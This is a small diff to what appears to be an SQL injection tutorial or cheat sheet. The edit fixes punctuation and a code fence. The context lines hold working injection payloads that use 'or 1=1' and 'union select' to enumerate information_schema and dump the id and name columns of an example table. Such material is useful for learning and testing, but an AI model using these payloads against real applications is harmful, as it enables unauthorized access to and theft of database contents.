@@ -125,10 +125,10 @@ param=' or 1=1 select column_name,null,null from information_schema.columns wher
 param=' or 1=1 select table_name as table,column_name as column,null from information_schema.columns#
 ```
 
-Let say the database name is `public` and table name is `info` with two columns in it `id` and `name`
+Let say the database name is `public` and table name is `info` with two columns in it `id` and `name`.
 
 
-``
+```
 param=' or 1=0 union select id,null,null from public.info#  --> display id column from table "info"
 
 param=' or 1=0 union select id,name,null from public.info#  --> display id and name column from table "info"
